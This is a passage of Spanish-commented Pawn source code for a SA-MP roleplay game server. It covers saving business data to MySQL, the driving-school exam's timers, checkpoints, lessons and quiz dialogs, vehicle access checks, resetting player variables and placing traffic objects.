	    format(sql, sizeof(sql), "UPDATE negocios SET EntradaX=%f,EntradaY=%f,EntradaZ=%f,SalidaX=%f,SalidaY=%f,SalidaZ=%f,Nombre='%s',Tipo=%d WHERE ID=%d",
		NegoInfo[idx][nEntradaX], //Pos x de entrada
		NegoInfo[idx][nEntradaY], //Pos y de entrada
		NegoInfo[idx][nEntradaZ], //Pos z de entrada
		NegoInfo[idx][nSalidaX], //Pos x de salida
		NegoInfo[idx][nSalidaY], //Pos y de salida
		NegoInfo[idx][nSalidaZ], //Pos z de salida
		NegoInfo[idx][nNombre], //Nombre del negocio
		NegoInfo[idx][nTipo], //Tipo de negocio
		NegoInfo[idx][nSQLID]); //ID en base de datos
		mysql_query(1, sql);
		
		format(sql, sizeof(sql), "UPDATE negocios SET VirtualWorld=%d,Interior=%d,VirtualWorld2=%d,Interior2=%d,Valor=%d,Comprado=%d,Dueno='%s',Cerrado=%d,DineroGuardado=%d,Prod=%d,MaxAlmacen=%d WHERE ID=%d",
		NegoInfo[idx][nVirtualWorld], //VW de la casa
		NegoInfo[idx][nInterior], //Int de la casa
		NegoInfo[idx][nVirtualWorld2], //VW de salida
		NegoInfo[idx][nInterior2], //Int de salida
		NegoInfo[idx][nValor], //Precio de la casa
		NegoInfo[idx][nComprado], //Si está comprada
		NegoInfo[idx][nDueno], //Nombre del dueño
		NegoInfo[idx][nCerrado], //Si está cerrado
		NegoInfo[idx][nDineroGuardado], //Dinero guardado
		NegoInfo[idx][nProd], //Productos del negocio
		NegoInfo[idx][nMaxAlmacen], //Max slots almacén
		NegoInfo[idx][nSQLID]); //ID en base de datos
		mysql_query(1, sql);
		
		for(new x=0; x<NegoInfo[idx][nMaxAlmacen]; x++)
		{
		    format(sql, sizeof(sql), "UPDATE negocios SET Almacen%d=%d,AlmacenCant%d=%d WHERE ID=%d",
		    x+1, NegoInfo[idx][nAlmacen][x], x+1, NegoInfo[idx][nAlmacenCant][x],
			NegoInfo[idx][nSQLID]);
			mysql_query(1, sql);
		}
		
		format(sql, sizeof(sql), "UPDATE negocios SET TallerEX=%f,TallerEY=%f,TallerEZ=%f,TallerERotZ=%f,TallerSX=%f,TallerSY=%f,TallerSZ=%f,TallerSRotZ=%f WHERE ID=%d",
		NegoInfo[idx][nTallerEX], //Pos x de entrada taller
		NegoInfo[idx][nTallerEY], //Pos y de entrada taller
		NegoInfo[idx][nTallerEZ], //Pos z de entrada taller
		NegoInfo[idx][nTallerERotZ], //Rot Z entrada taller
		NegoInfo[idx][nTallerSX], //Pos x de salida taller
		NegoInfo[idx][nTallerSY], //Pos y de salida taller
		NegoInfo[idx][nTallerSZ], //Pos z de salida taller
		NegoInfo[idx][nTallerSRotZ], //Rot Z salida taller
		NegoInfo[idx][nSQLID]); //ID en base de datos
		mysql_query(1, sql);
	}
	return 1;
}

forward NoticiasLSN(color, string[]);
public NoticiasLSN(color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			SendClientMessage(i, color, string);
		}
	}
}

forward MaxTiempoAutoEscuela(playerid);
public MaxTiempoAutoEscuela(playerid)
{
	new AE = EnAutoEscuela[playerid];
	if(AE == 1)
	{
		SendClientMessage(playerid, Rojo, "* Has tardado demasiado tiempo en realizar el recorrido.");
		SetPlayerPos(playerid, 2045.6418,-1908.1290,13.5469);
		EnAutoEscuela[playerid] = 0;
		CheckPointAutoEscuela[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
		MaxTiempoAutoEscuelaTimer[playerid] = NOEXISTE;
	}
	if(AE == 2)
	{
		SendClientMessage(playerid, Rojo, "* Has tardado demasiado tiempo en completar el recorrido.");
		SetPlayerPos(playerid, AutoEscuelas[AE-1][AutoX], AutoEscuelas[AE-1][AutoY], AutoEscuelas[AE-1][AutoZ]);
		EnAutoEscuela[playerid] = 0;
		CheckPointAutoEscuela[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
		DisablePlayerRaceCheckpoint(playerid);
		MaxTiempoAutoEscuelaTimer[playerid] = NOEXISTE;
		SetVehicleToRespawn(58); //CocheAutoescuelaAvion
	}
	if(AE == 3)
	{
		SendClientMessage(playerid, Rojo, "* Has tardado demasiado tiempo en completar el recorrido.");
		SetPlayerPos(playerid, AutoEscuelas[AE-1][AutoX], AutoEscuelas[AE-1][AutoY], AutoEscuelas[AE-1][AutoZ]);
		EnAutoEscuela[playerid] = 0;
		CheckPointAutoEscuela[playerid] = 0;
		DisablePlayerRaceCheckpoint(playerid);
		MaxTiempoAutoEscuelaTimer[playerid] = NOEXISTE;
		SetVehicleToRespawn(59); //CocheAutoescuelaBarco
	}
	return 1;
}

SetCheckPointAutoescuela(playerid)
{
	if(EnAutoEscuela[playerid] == 1) //Coches
	{
	    new CP = CheckPointAutoEscuela[playerid];
	    SetPlayerCheckpoint(playerid, ChecksPracticoCoche[CP][0], ChecksPracticoCoche[CP][1], ChecksPracticoCoche[CP][2], 5.0);
	    CheckPointAutoEscuela[playerid] ++;
	}
	if(EnAutoEscuela[playerid] == 2) //Aviones
	{
	    new CP = CheckPointAutoEscuela[playerid];
	    if(CP == 0){DisablePlayerCheckpoint(playerid);}
	    if(CP == 17){DisablePlayerRaceCheckpoint(playerid);}
	    if(CP >= 17){SetPlayerCheckpoint(playerid, ChecksPracticoAvion[CP][0], ChecksPracticoAvion[CP][1], ChecksPracticoAvion[CP][2], 5.0);}
	    else{SetPlayerRaceCheckpoint(playerid,3,ChecksPracticoAvion[CP][0],ChecksPracticoAvion[CP][1],ChecksPracticoAvion[CP][2],ChecksPracticoAvion[CP+1][0],ChecksPracticoAvion[CP+1][1],ChecksPracticoAvion[CP+1][2],8.0);}
	    CheckPointAutoEscuela[playerid] ++;
	}
	if(EnAutoEscuela[playerid] == 3) //Barcos
	{
	    new CP = CheckPointAutoEscuela[playerid];
	    SetPlayerRaceCheckpoint(playerid, 0, ChecksPracticoBarco[CP][0], ChecksPracticoBarco[CP][1], ChecksPracticoBarco[CP][2], ChecksPracticoBarco[CP+1][0], ChecksPracticoBarco[CP+1][1], ChecksPracticoBarco[CP+1][2], 5.0);
	    CheckPointAutoEscuela[playerid] ++;
	}
}

forward TimerAutoescuela(playerid);
public TimerAutoescuela(playerid)
{
	if(EnAutoEscuela[playerid] == 1 && !CocheAutoescuelaCond(GetPlayerVehicleID(playerid))){SendClientMessage(playerid, Rojo, "* Has tardado demasiado en subir a un vehículo de la autoescuela."); KillTimer(MaxTiempoAutoEscuelaTimer[playerid]); EnAutoEscuela[playerid] = 0; CheckPointAutoEscuela[playerid] = 0; DisablePlayerCheckpoint(playerid); return 1;}
	if(EnAutoEscuela[playerid] == 2 && !CocheAutoescuelaAvion(GetPlayerVehicleID(playerid))){SendClientMessage(playerid, Rojo, "* Has tardado demasiado en subir a la avioneta."); KillTimer(MaxTiempoAutoEscuelaTimer[playerid]); EnAutoEscuela[playerid] = 0; CheckPointAutoEscuela[playerid] = 0; DisablePlayerCheckpoint(playerid); DisablePlayerRaceCheckpoint(playerid); return 1;}
	if(EnAutoEscuela[playerid] == 3 && !CocheAutoescuelaBarco(GetPlayerVehicleID(playerid))){SendClientMessage(playerid, Rojo, "* Has tardado demasiado en subir a la lancha."); KillTimer(MaxTiempoAutoEscuelaTimer[playerid]); EnAutoEscuela[playerid] = 0; CheckPointAutoEscuela[playerid] = 0; DisablePlayerRaceCheckpoint(playerid); return 1;}
	return 1;
}

TemaAutoescuelaCond(playerid, tema)
{
	if(tema == 0)
	{
	    new Autoescuela[800];
		strcat(Autoescuela,"Bienvenido a la autoescuela. Aquí aprenderás cómo conducir sin poner en peligro tu vida o la de los que te rodean.\n");
		strcat(Autoescuela,"Este examen se compone de dos partes, una teórica y otra práctica. Para aprobarlo deberás superar las dos partes.\n");
		strcat(Autoescuela,"En caso de no poder superar alguna parte, se te descontará 100$ por la plaza. Si apruebas el examen deberás pagar 700$\n");
		strcat(Autoescuela,"para recibir tu carnet de conducir.\n");
		strcat(Autoescuela,"\n");
		strcat(Autoescuela,"Ahora recibirás una clase acerca de cómo conducir correctamente y qué hacer en casos de emergencia. Presta atención.\n");
		ShowPlayerDialog(playerid,7,DIALOG_STYLE_MSGBOX,"Examen de conducción",Autoescuela,"Siguiente","Salir");
	}
	if(tema == 1)
	{
	    new Autoescuela[800];
	 	strcat(Autoescuela,"A la hora de conducir, siempre hay que llevar el coche por el carril derecho. Conducir por el carril izquierdo sería\n");
		strcat(Autoescuela,"ir en contrasentido, una falta muy grave ya que puede provocar muchos accidentes. Existen carriles múltiples, significa\n");
		strcat(Autoescuela,"que dos o más carriles van en la misma dirección, uno al lado del otro.\n");
		ShowPlayerDialog(playerid,8,DIALOG_STYLE_MSGBOX,"Examen de conducción - Carriles",Autoescuela,"Siguiente","Anterior");
	}
	if(tema == 2)
	{
	    new Autoescuela[800];
	    strcat(Autoescuela,"Conducir bajo los efectos del alcohol u otras drogas es muy peligroso. Alquien que ha tomado drogas no es capaz de\n");
	    strcat(Autoescuela,"controlar su cuerpo completamente, por lo que su capacidad de reacción disminuye. Si has consumido drogas y tienes que\n");
	    strcat(Autoescuela,"desplazarte se aconseja llamar a un amigo o un taxi, o ir caminando.\n");
	    ShowPlayerDialog(playerid,9,DIALOG_STYLE_MSGBOX,"Examen de conducción - Drogas al volante",Autoescuela,"Siguiente","Anterior");
	}
	if(tema == 3)
	{
	    new Autoescuela[800];
		strcat(Autoescuela,"Las distracciones al volante son muy comunes. Cosas que te distraigan como hablar por móvil, mirar el GPS, o estar\n");
	    strcat(Autoescuela,"fumándose un cigarrillo puede provocar un accidente. Hablar por movil cuando se conduce es una falta grave.\n");
	    strcat(Autoescuela,"Para estar alerta de los peligros que puedan aparecer en la carretera hay que estar bien despierto y mirando siempre al\n");
	    strcat(Autoescuela,"frente. Beber refrescos con cafeina te ayudan a distraerte menos a la hora de conducir.\n");
	    ShowPlayerDialog(playerid,10,DIALOG_STYLE_MSGBOX,"Examen de conducción - Distracciones",Autoescuela,"Siguiente","Anterior");
	}
	if(tema == 4)
	{
	    new Autoescuela[800];
		strcat(Autoescuela,"A veces cuando conducimos podemos encontrarnos con accidentes que han ocurrido. Si vemos un accidente en el cual\n");
		strcat(Autoescuela,"no hay nadie socorriendo a las víctimas, es una obligación llamar a los servicios de emergencia o pedir ayuda.\n");
		strcat(Autoescuela,"Debemos comprobar sí está consciente o inconsciente. Si está inconsciente debemos quedarnos con él hasta que lleguen\n");
		strcat(Autoescuela,"los servicios de emergencia. Recuerda que no debes intentar socorrerle tú mismo, podrías herirle aun más o incluso\n");
		strcat(Autoescuela,"provocarle la muerte.\n");
		ShowPlayerDialog(playerid,11,DIALOG_STYLE_MSGBOX,"Examen de conducción - Emergencias",Autoescuela,"Siguiente","Anterior");
	}
	if(tema == 5)
	{
	    new Autoescuela[800];
		strcat(Autoescuela,"A la hora de estacionar nuestro vehículo debemos ser consciente de dónde aparcamos, ya que puede ser una zona\n");
		strcat(Autoescuela,"que dificulte el paso de otros vehículos o que no está hecha para esa acción, lo cual te puede costar una multa.\n");
		strcat(Autoescuela,"Para aparcar correctamente debemos fijarnos en que la zona está creada con ese fin, o que sea una zona donde\n");
		strcat(Autoescuela,"no moleste el paso de peatones o de otros vehículos. Podemos aparcar correctamente dejando el vehículo en un\n");
		strcat(Autoescuela,"parking, zona azul, o dejando una mitad del coche en la acera y la otra en la carretera siempre y cuando no\n");
		strcat(Autoescuela,"dificulte el paso de otros vehículos o peatones.\n");
		ShowPlayerDialog(playerid,12,DIALOG_STYLE_MSGBOX,"Examen de conducción - Aparcar correctamente",Autoescuela,"Siguiente","Anterior");
	}
	if(tema == 6)
	{
	    new Autoescuela[800];
		strcat(Autoescuela,"Para conducir en la ciudad, el máximo de velocidad permitido es de 70Km/h. Aunque lo aconsejable es ir a 50Km/h.\n");
		strcat(Autoescuela,"En carreteras el límite permitido es de 100Km/, y en autopistas 120Km/h, pero recuerda que a más velocidad se\n");
	    strcat(Autoescuela,"reduce el tiempo de reacción y aumenta la probabilidad de accidentes de conducción.\n");
	    strcat(Autoescuela,"Por último; cuando escuchemos sirenas de un vehículo de emergencias o lleve las luces de emergencia encendidas\n");
	    strcat(Autoescuela,"debemos cederle el paso, ya que posiblemente estén atentiendo a una llamada grave.\n");
		ShowPlayerDialog(playerid,13,DIALOG_STYLE_MSGBOX,"Examen de conducción - Velocidades y señales de emergencia",Autoescuela,"Siguiente","Anterior");
	}
	if(tema == 7)
	{
	    new Autoescuela[800];
		strcat(Autoescuela,"Hasta aquí la clase teórica, ahora se te harán diversas preguntas para comprobar que sabes lo necesario para\n");
		strcat(Autoescuela,"conducir correctamente. Piensa bien antes de responder, si fallas alguna pregunta perderás 100$ por la plaza.\n");
		strcat(Autoescuela," \n");
		strcat(Autoescuela,"Buena suerte.\n");
		ShowPlayerDialog(playerid,14,DIALOG_STYLE_MSGBOX,"Examen de conducción - Final",Autoescuela,"Comenzar","Anterior");
	}
}

PreguntaAutoescuelaCond(playerid, pregunta)
{
	if(pregunta == 0)
	{
	    new Autoescuela[800];
		strcat(Autoescuela,"Debemos dejar paso a un coche de emergencias si...\n");
		strcat(Autoescuela," \n");
		strcat(Autoescuela,"1: ...nos pita.\n");
		strcat(Autoescuela,"2: ...nos grita que nos apartemos.\n");
		strcat(Autoescuela,"3: Siempre.\n");
		strcat(Autoescuela,"4: ...lleva las sirenas encendidas.\n");
		ShowPlayerDialog(playerid, 15, DIALOG_STYLE_INPUT, "Pregunta 1", Autoescuela, "Aceptar", "Salir");
	}
	if(pregunta == 1)
	{
	    new Autoescuela[800];
		strcat(Autoescuela,"¿Cuál es la máxima velocidad permitida en ciudad?\n");
		strcat(Autoescuela," \n");
		strcat(Autoescuela,"1: 80Km/h\n");
		strcat(Autoescuela,"2: 70Km/h\n");
		strcat(Autoescuela,"3: 60Km/h\n");
		strcat(Autoescuela,"4: 65Km/h\n");
		ShowPlayerDialog(playerid, 16, DIALOG_STYLE_INPUT, "Pregunta 2", Autoescuela, "Aceptar", "Salir");
	}
	if(pregunta == 2)
	{
	    new Autoescuela[800];
		strcat(Autoescuela,"Si vemos que se produce un accidente ¿qué debemos hacer?\n");
		strcat(Autoescuela," \n");
		strcat(Autoescuela,"1: Tumbar a los heridos en el suelo y pedir ayuda.\n");
		strcat(Autoescuela,"2: Llamar a emergencias o pedir ayuda.\n");
		strcat(Autoescuela,"3: Llevar a los héridos al hospital.\n");
		strcat(Autoescuela,"4: Nada, Los servicios de emergencias ya están en camino.\n");
		ShowPlayerDialog(playerid, 17, DIALOG_STYLE_INPUT, "Pregunta 3", Autoescuela, "Aceptar", "Salir");
	}
	if(pregunta == 3)
	{
	    new Autoescuela[800];
		strcat(Autoescuela,"¿Cuál de estas acciones no está prohibida hacer mientras se conduce?\n");
		strcat(Autoescuela," \n");
		strcat(Autoescuela,"1: Utilizar cascos o auriculares.\n");
		strcat(Autoescuela,"2: Hablar por el móvil.\n");
		strcat(Autoescuela,"3: Escuchar la radio.\n");
		strcat(Autoescuela,"4: Las tres anteriores están prohibidas.\n");
		ShowPlayerDialog(playerid, 18, DIALOG_STYLE_INPUT, "Pregunta 4", Autoescuela, "Aceptar", "Salir");
	}
	if(pregunta == 4)
	{
	    new Autoescuela[800];
		strcat(Autoescuela,"¿Cómo debe estacionarse un vehículo?\n");
		strcat(Autoescuela," \n");
		strcat(Autoescuela,"1: En zonas hechas para eso.\n");
		strcat(Autoescuela,"2: En zonas hechas para eso y si quiero en un lado del asfalto.\n");
		strcat(Autoescuela,"3: En zonas hechas para eso o dejando una mitad del vehículo en el asfalto y la otra en la acera.\n");
		strcat(Autoescuela,"4: Todas son correctas.\n");
		ShowPlayerDialog(playerid, 19, DIALOG_STYLE_INPUT, "Pregunta 5", Autoescuela, "Aceptar", "Salir");
	}
}

stock PlayerTieneLlaveVeh(playerid, vehicleid)
{
	if(vehicleid <= MAX_VEHPUBLICO){return 0;}
    new TieneLlave;
    for(new x = 0; x < 5; x++)
    {
		if(PlayerInfo[playerid][pLlaveCoche][x] == CarInfo[vehicleid][cLlave] || PlayerInfo[playerid][pLlaveCochePrestado][x] == CarInfo[vehicleid][cLlave]){
		TieneLlave = 1; break;}
	}
	if(TieneLlave != 0){return 1;}
	return 0;
}

stock PlayerEsFaccionVeh(playerid, vehicleid)
{
	if(vehicleid > MAX_VEHPUBLICO){return 0;}
	if(CocheLSPD(vehicleid) && PlayerInfo[playerid][pFaccion] == 1){return 1;}
	if(CocheGOB(vehicleid) && (PlayerInfo[playerid][pFaccion] == 3 || PlayerInfo[playerid][pFaccion] == 1)){return 1;}
	if(CocheLSN(vehicleid) && PlayerInfo[playerid][pFaccion] == 4){return 1;}
	if(CocheAutoescuelaCond(vehicleid) && EnAutoEscuela[playerid] == 1){return 1;}
	if(CocheAutoescuelaAvion(vehicleid) && EnAutoEscuela[playerid] == 2){return 1;}
	if(CocheAutoescuelaBarco(vehicleid) && EnAutoEscuela[playerid] == 3){return 1;}
	if(IsAPizzaBike(vehicleid) && PlayerInfo[playerid][pTrabajo] == 1){return 1;}
	if(IsASweeper(vehicleid) && PlayerInfo[playerid][pTrabajo] == 2){return 1;}
	if(IsASecuricar(vehicleid) && PlayerInfo[playerid][pTrabajo] == 3){return 1;}
	if(IsACombine(vehicleid) && PlayerInfo[playerid][pTrabajo] == 4){return 1;}
	if(IsACropduster(vehicleid) && PlayerInfo[playerid][pTrabajo] == 5){return 1;}
	if(IsATaxi(vehicleid) && PlayerInfo[playerid][pTrabajo] == 6){return 1;}
	if(IsABarcoPesca(vehicleid) && PlayerInfo[playerid][pTrabajo] == 9){return 1;}
	return 0;
}

forward RestartServidor();
public RestartServidor()
{
    SendRconCommand("gmx");
}

stock ResetPlayerVars(playerid) //Resetea todas las variables del jugador
{
	JugadorRegistrado[playerid] = 0;
    JugadorLogueado[playerid] = 0;  //Sistema de logueo
    IntentosLogueo[playerid] = 0;
    PrimerSpawn[playerid] = 0; //Sistema de spawn
    AdminDuty[playerid] = 0; //Sistema admin duty
    GodMode[playerid] = 0; //Sistema godmode
    Volando[playerid] = 0; //Sistema vuelo
    ChatOOC[playerid] = 0; //Chat OOC /b
    Yo[playerid] = 0; //Comando /yo
	reclutarfaccion[playerid] = 0; //Comando /reclutar
    reclutarlider[playerid] = 0;
    TimerSonidoDisparo[playerid] = 0; //Sonido de disparos
	MuertoTimer[playerid] = 0; //Sistema de muerte
	MuertoFlashTimer[playerid] = 0;
    Muerte[playerid] = 0;
    Taseado[playerid] = 0; //Sistema de táser
    EnCatalogoVeh[playerid] = NOEXISTE; //Catalogo
    AntiBH[playerid] = 0; //Sistema antibh
    Esposado[playerid] = 0; //Sistema de esposas
    SolicitaRefuerzos[playerid] = 0; //Sistema de refuerzos LSPD
    CederTiempo[playerid] = 0; //Timer para ceder objetos
    RecargarTiempo[playerid] = 0; //Timer para recargar
    MultaPrecio[playerid] = 0; //Sistema de multas
    Multador[playerid] = NOEXISTE;
    LlenandoDeposito[playerid] = 0;
    VenderVeh[playerid] = 0; //Sistema de desguace
    VenderVehAPrecio[playerid] = 0; //Sistema venta de vehículos a otras personas
	VenderVehAVendedor[playerid] = NOEXISTE;
	VenderVehALlave[playerid] = 0;
	VehMaleteroPlayer[playerid] = 0; //Maletero
	EnAutoEscuela[playerid] = 0; //Autoescuela
	CheckPointAutoEscuela[playerid] = 0;
	MaxTiempoAutoEscuelaTimer[playerid] = NOEXISTE;
	MascaraGas[playerid] = 0; //Comando /mascara
	Trabajando[playerid] = 0; //Trabajo
	OfertaTrabajo[playerid] = NOEXISTE;
	Tarifa[playerid] = 0; //Trabajo
	PizzaRepartida[playerid] = 0; //Job pizzero
	SolicitaPizza[playerid] = 0;
	CalleBarrida[playerid] = 0; //Job barrendero
	CajeroRepuesto[playerid] = 0; //Job securicar
	Cosechado[playerid] = 0; //Job cosechador
	Fumigado[playerid] = 0; //Job fumigador
	TimerDejarTrabajar[playerid] = NOEXISTE;
	TaxiConductor[playerid] = NOEXISTE; //Job taxista
	TaxiPasajero[playerid] = NOEXISTE;
	TaxiCoste[playerid] = 0;
	SolicitaTaxi[playerid] = 0;
	ReparacionTipo[playerid] = 0; //Job mecánico
	ReparacionMeca[playerid] = NOEXISTE;
	ReparacionPrecio[playerid] = 0;
	RepintadoColor1[playerid] = 0;
	RepintadoColor2[playerid] = 0;
	RepintadoMeca[playerid] = NOEXISTE;
	RepintadoPrecio[playerid] = 0;
	PuertaForzada[playerid] = 0; //Job ladrón
	Robando[playerid] = 0;
	Puenteando[playerid] = 0;
	PescaRecogida[playerid] = 0; //Job pescador
	DineroPesca[playerid] = 0;
	Contratador[playerid] = NOEXISTE; //Talleres mecánicos
	Contrato[playerid] = 0;
	PuenteHecho[playerid] = 0;
    EnLlamada[playerid] = 0; //Sistema teléfono
    ToqueLlamada[playerid] = 0;
    PersonaEnLlamada[playerid] = NOEXISTE;
    CosteTotalLlamada[playerid] = 0;
    for(new x=0; x<16; x++) //Agenda
    {
        AgendaNumero[playerid][x] = 0;
    }
    LocalizarVeh[playerid] = 0; //Comando /Localizarveh
    MirandoContactoAgenda[playerid] = 0;
    Idioma[playerid] = 0; //Sistema idiomas
    oldcarid[playerid] = 0; //Comando /oldcar
    PagarTimer[playerid] = 0; //Comando /pagar
    EditNegoPos[playerid] = 0; //Comando /editnego
    PreparandoDroga[playerid] = 0; //Comando /preparar
    IntentarUsado[playerid] = 0; //Comando /intentar
    MisionEncargada[playerid] = 0; //Sistema de misiones de pandillas
	RealizandoMision[playerid] = 0;
	MuroAPintar[playerid] = NOEXISTE;
	TransferirPlayer[playerid] = NOEXISTE; //ATM Transferir
	HaciendoPressBanca[playerid] = 0; //Comando /Entrenar
	RepeticionesPressBanca[playerid] = 0;
	MatriculasActivadas[playerid] = 0; //Sistema matrículas
	//SISTEMA ANTICHEAT
	DineroAC[playerid] = 0;
	PingKick[playerid] = 0;
    ArmaSpawnAC[playerid] = 0;
    TimerBlockIP[playerid] = NOEXISTE;
    EstaAFK[playerid] = 0;
    AntiAFKPos[playerid][0] = 0;
    AntiAFKPos[playerid][1] = 0;
    AntiAFKPos[playerid][2] = 0;
    AntiAFKPos[playerid][3] = 0;
    AntiAFKPos[playerid][4] = 0;
    AntiAFKPos[playerid][5] = 0;
    AFKTimer[playerid] = NOEXISTE;
    ChalecoAC[playerid] = 0;
    VehicleHack[playerid] = 0;
    //CurrentVeh[playerid] = 0;
    //FIN SISTEMA ANTICHEAT
    LaserON[playerid] = 0; //Lasers en armas
    SiendoReparado[playerid] = 0; //Autoreparar
    CinturonPuesto[playerid] = 0; //Cinturón
    PrestadorCoche[playerid] = NOEXISTE; // /PrestarLlave
    LlavePrestada[playerid] = NOEXISTE;
	AtendiendoInforme[playerid] = NOEXISTE; //Informes LSED
	
	PlayerInfo[playerid][pSQLID] = 0; //Reinicia todas los valores de PlayerInfo
	PlayerInfo[playerid][pAdmin] = 0;
	PlayerInfo[playerid][pBloqueado] = 0;
    PlayerInfo[playerid][pPrimerLogueo] = 0;
    PlayerInfo[playerid][pEdad] = 0;
    PlayerInfo[playerid][pSexo] = 0;
    PlayerInfo[playerid][pNivel] = 0;
    PlayerInfo[playerid][pExp] = 0;
    PlayerInfo[playerid][pVida] = 100.0;
    PlayerInfo[playerid][pChaleco] = 0;
    PlayerInfo[playerid][pTelefono] = 0;
    PlayerInfo[playerid][pTrabajo] = 0;
    PlayerInfo[playerid][pContrato] = 0;
    PlayerInfo[playerid][pEsperaTrabajar] = 0;
    PlayerInfo[playerid][pPosX] = 0;
    PlayerInfo[playerid][pPosY] = 0;
    PlayerInfo[playerid][pPosZ] = 0;
    PlayerInfo[playerid][pDineroBanco] = 0;
    PlayerInfo[playerid][pDineroMano] = 0;
    PlayerInfo[playerid][pEncarcelado] = 0;
    PlayerInfo[playerid][pTiempoCarcel] = 0;
    PlayerInfo[playerid][pAdvertencias] = 0;
    PlayerInfo[playerid][pSpecID] = INVALID_PLAYER_ID;
    PlayerInfo[playerid][pSkin] = 0;
    PlayerInfo[playerid][pFaccion] = 0;
    PlayerInfo[playerid][pRango] = 0;
    PlayerInfo[playerid][pLider] = 0;
    PlayerInfo[playerid][pPuntosRol] = 0;
    PlayerInfo[playerid][pHabPistola] = 0;
	PlayerInfo[playerid][pHabSD] = 0;
	PlayerInfo[playerid][pHabDEagle] = 0;
	PlayerInfo[playerid][pHabEscopeta] = 0;
	PlayerInfo[playerid][pHabSawnoff] = 0;
	PlayerInfo[playerid][pHabEscopetaCom] = 0;
	PlayerInfo[playerid][pHabUZI] = 0;
	PlayerInfo[playerid][pHabMP5] = 0;
	PlayerInfo[playerid][pHabAK47] = 0;
	PlayerInfo[playerid][pHabM4] = 0;
	PlayerInfo[playerid][pHabFranco] = 0;
	PlayerInfo[playerid][pInterior] = 0;
	PlayerInfo[playerid][pVirtualWorld] = 0;
    for(new x = 0; x < 8; x++)
	{
	    PlayerInfo[playerid][pBol][x] = 0;
	    PlayerInfo[playerid][pBolCant][x] = 0;
	}
	PlayerInfo[playerid][pManoIzq] = 0;
	PlayerInfo[playerid][pManoIzqCant] = 0;
	PlayerInfo[playerid][pManoDer] = 0;
	PlayerInfo[playerid][pManoDerCant] = 0;
	PlayerInfo[playerid][pMuerto] = 0;
	PlayerInfo[playerid][pEspalda] = 0;
	PlayerInfo[playerid][pEspaldaCant] = 0;
	for(new x = 0; x < 8; x++)
	{
	    PlayerInfo[playerid][pCint][x] = 0;
	    PlayerInfo[playerid][pCintCant][x] = 0;
	}
	PlayerInfo[playerid][pServicioPD] = 0;
	for(new x = 0; x < 5; x++)
	{
	    PlayerInfo[playerid][pLlaveCoche][x] = 0;
	}
	for(new x = 0; x < 5; x++)
	{
	    PlayerInfo[playerid][pLlaveCochePrestado][x] = 0;
	}
	PlayerInfo[playerid][pMinPayDay] = 0;
	PlayerInfo[playerid][pLicConduccion] = 0;
	PlayerInfo[playerid][pLicNavegacion] = 0;
	PlayerInfo[playerid][pLicAviacion] = 0;
	PlayerInfo[playerid][pLicArmas] = 0;
	PlayerInfo[playerid][pLicPesca] = 0;
	PlayerInfo[playerid][pLicCaza] = 0;
	PlayerInfo[playerid][pCasa] = 0;
	PlayerInfo[playerid][pCasaAlq] = 0;
	PlayerInfo[playerid][pNegocio] = 0;
	PlayerInfo[playerid][pTaller] = 0;
	PlayerInfo[playerid][pHabMec] = 0;
	PlayerInfo[playerid][pHabLad] = 0;
	PlayerInfo[playerid][pTiempoRobo] = 0;
	PlayerInfo[playerid][pHambre] = 0;
	PlayerInfo[playerid][pSed] = 0;
	for(new x=0; x<5; x++)
	{
	    PlayerInfo[playerid][pAdiccion][x] = 0;
	}
	for(new x=0; x<5; x++)
	{
	    PlayerInfo[playerid][pDrConsumida][x] = 0;
	}
	PlayerInfo[playerid][pFuerza] = 0;
	PlayerInfo[playerid][pCansancioEntrenar] = 0;
    return 1;
}

stock GetVehicleName(vehicleid) //Retorna nombre de modelo de un vehículo
{
	new String[128];
    format(String,sizeof(String),"%s",VehicleNames[GetVehicleModel(vehicleid) - 400]);
    return String;
}

stock CreateCopObject(tipo, Float:x,Float:y,Float:z,Float:Angle) //Crear objetos de trafico
{
	switch(tipo)
	{
		case 1:
		{
			for(new i = 0; i < sizeof(ObjectsInfo); i++)
			{
				if(ObjectsInfo[i][cpCreated] == 0)
				{
					ObjectsInfo[i][cpType]=tipo;
					ObjectsInfo[i][cpCreated]=1;
					ObjectsInfo[i][cpX]=x;
					ObjectsInfo[i][cpY]=y;
					ObjectsInfo[i][cpZ]=z-0.7;
					ObjectsInfo[i][cpObject] = CreateDynamicObject(2899, x, y, z-0.9, 0, 0, Angle-90);
					return 1;
				}
			}
		}
		case 2:
		{
			for(new i = 0; i < sizeof(ObjectsInfo); i++)
			{
				if(ObjectsInfo[i][cpCreated] == 0)
				{
					ObjectsInfo[i][cpType]=tipo;
					ObjectsInfo[i][cpCreated]=1;
					ObjectsInfo[i][cpX]=x;
					ObjectsInfo[i][cpY]=y;
					ObjectsInfo[i][cpZ]=z-0.5;
					ObjectsInfo[i][cpObject] = CreateDynamicObject(1238, x, y, z-0.5, 0, 0, Angle-90);
					return 1;
				}
			}
		}
		case 3:
		{
			for(new i = 0; i < sizeof(ObjectsInfo); i++)
			{
				if(ObjectsInfo[i][cpCreated] == 0)
				{
					ObjectsInfo[i][cpType]=tipo;
					ObjectsInfo[i][cpCreated]=1;
					ObjectsInfo[i][cpX]=x;
					ObjectsInfo[i][cpY]=y;
					ObjectsInfo[i][cpZ]=z-0.3;
					ObjectsInfo[i][cpObject] = CreateDynamicObject(1423, x, y, z-0.3, 0, 0, Angle);
					return 1;
				}
			}
		}
		case 4:
		{
			for(new i = 0; i < sizeof(ObjectsInfo); i++)
			{
				if(ObjectsInfo[i][cpCreated] == 0)
				{
					ObjectsInfo[i][cpType]=tipo;
					ObjectsInfo[i][cpCreated]=1;
					ObjectsInfo[i][cpX]=x;
					ObjectsInfo[i][cpY]=y;
					ObjectsInfo[i][cpZ]=z-0.5;
					ObjectsInfo[i][cpObject] = CreateDynamicObject(1422, x, y, z-0.5, 0, 0, Angle);
					return 1;
				}
			}
		}
	}
  	return 0;
}

stock DeleteAllObjects() //Quitar todos objetos de trafico
{
    for(new i = 0; i < sizeof(ObjectsInfo); i++)
  	{
  	    if(ObjectsInfo[i][cpCreated] == 1)
  	    {
			ObjectsInfo[i][cpType]=0;
  	        ObjectsInfo[i][cpCreated]=0;
            ObjectsInfo[i][cpX]=0.0;
            ObjectsInfo[i][cpY]=0.0;
            ObjectsInfo[i][cpZ]=0.0;
            DestroyDynamicObject(ObjectsInfo[i][cpObject]);
  	    }
	}
    return 0;
}

stock DeleteClosestObject(playerid) //Quitar objetos de trafico
{
